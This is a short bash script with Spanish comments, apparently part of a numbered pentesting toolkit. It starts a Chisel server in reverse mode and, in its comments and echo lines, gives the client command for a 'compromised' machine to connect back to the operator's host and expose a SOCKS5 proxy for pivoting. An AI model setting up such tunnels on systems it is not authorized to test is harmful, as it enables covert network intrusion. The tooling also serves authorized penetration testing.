#!/bin/bash
# 05_chisel_server.sh
# Levanta un servidor Chisel en modo --reverse, para que un host
# comprometido se conecte como cliente y exponga un proxy SOCKS.
#
# Uso:
#   ./05_chisel_server.sh <ruta_chisel> <puerto_chisel>
#
# Ejemplo:
#   ./05_chisel_server.sh ./chisel 9000
#
# En la maquina comprometida (cliente), conectar con:
#   ./chisel client <IP_SERVIDOR>:<PUERTO> R:socks
#
# Esto expondra un proxy SOCKS5 en 127.0.0.1:1080 en ESTA maquina.
# Añadelo a proxychains con 04_add_proxychain.sh 1080

set -euo pipefail

CHISEL_BIN="${1:?Uso: $0 <ruta_chisel> <puerto_chisel>}"
PORT="${2:?Falta el puerto del servidor chisel}"

if [ ! -x "$CHISEL_BIN" ]; then
    chmod +x "$CHISEL_BIN" 2>/dev/null || true
fi

echo "[*] Levantando servidor Chisel en modo --reverse, puerto ${PORT}..."
echo "[*] En la maquina cliente ejecuta:"
echo "    ./chisel client <ESTA_IP>:${PORT} R:socks"
echo

"$CHISEL_BIN" server -p "$PORT" --reverse
